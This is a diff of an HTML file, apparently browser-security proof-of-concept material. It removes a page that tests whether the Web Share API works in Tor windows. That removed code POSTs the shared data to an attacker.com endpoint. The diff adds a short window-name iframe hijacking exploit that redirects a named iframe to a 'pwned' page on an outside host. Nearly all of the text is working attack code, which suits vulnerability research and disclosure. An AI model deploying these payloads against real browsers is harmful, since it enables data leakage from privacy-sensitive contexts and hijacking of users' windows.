@@ -1,74 +1,8 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Secure Tor Document</title>
-</head>
-<body>
-    <div id="content">
-        <h1>Confidential Document</h1>
-        <p>This is sensitive information only meant for Tor browsing.</p>
-        <p><strong>Document ID:</strong> TOR-INTERNAL-2024-001</p>
-        <p><strong>Classification:</strong> RESTRICTED</p>
-        
-        <button onclick="shareSensitiveData()">Share Document Summary</button>
-    </div>
 
-    <script>
-        function shareSensitiveData() {
-            // Data sensitif yang seharusnya tidak bisa di-share dari Tor window
-            const sensitiveData = {
-                documentId: 'TOR-INTERNAL-2024-001',
-                classification: 'RESTRICTED',
-                content: 'Operational details for upcoming network maintenance',
-                accessLevel: 'TOR-ONLY',
-                timestamp: new Date().toISOString()
-            };
+<iframe id=f src=//v8.idlixku.com name=openToMe></iframe>
+<button onclick="window.open('https://tv8.idlixku.com/')">clickMe</button>
+<script>
 
-            // Exploit: navigator.share() seharusnya disabled di Tor windows
-            if (navigator.share) {
-                navigator.share({
-                    title: 'Tor Internal Document',
-                    text: `Document ${sensitiveData.documentId} - ${sensitiveData.content}`,
-                    url: window.location.href
-                })
-                .then(() => {
-                    console.log('✅ SENSITIVE DATA SHARED FROM TOR WINDOW!');
-                    // Log ke server attacker bahwa data berhasil dibocorkan
-                    fetch('https://attacker.com/log-tor-leak', {
-                        method: 'POST',
-                        body: JSON.stringify(sensitiveData),
-                        mode: 'no-cors'
-                    });
-                })
-                .catch(error => {
-                    console.log('Share failed:', error);
-                });
-            } else {
-                alert('Web Share API not supported in this Tor context (EXPECTED BEHAVIOR)');
-            }
-        }
-
-        // Auto-detect jika di Tor context dan coba exploit
-        function checkTorContext() {
-            // Deteksi sederhana Tor context (bisa dengan checking .onion domain dll)
-            if (window.location.hostname.includes('.onion') || 
-                document.referrer.includes('.onion')) {
-                
-                console.log('🔓 Tor Context Detected - Testing share() vulnerability');
-                
-                // Coba trigger share setelah page load
-                setTimeout(() => {
-                    if (navigator.share) {
-                        console.log('⚠️ VULNERABLE: navigator.share() available in Tor window');
-                        document.getElementById('content').innerHTML += 
-                            '<p style="color:red">SECURITY WARNING: Share API should be disabled in Tor!</p>';
-                    }
-                }, 2000);
-            }
-        }
-
-        // Jalankan check saat page load
-        checkTorContext();
-    </script>
-</body>
-</html>
+setTimeout(()=>{f.onload=()=>{alert("Hijacked - the victim's window.open opened to the attacker's iframe. Now we can redirect that iframe");f.onload=()=>{};f.src="//poc.rhynorater.com/iframeHijacking/pwned.html"}}, 2000)
+</script>
+<img src="./Graphic.svg">
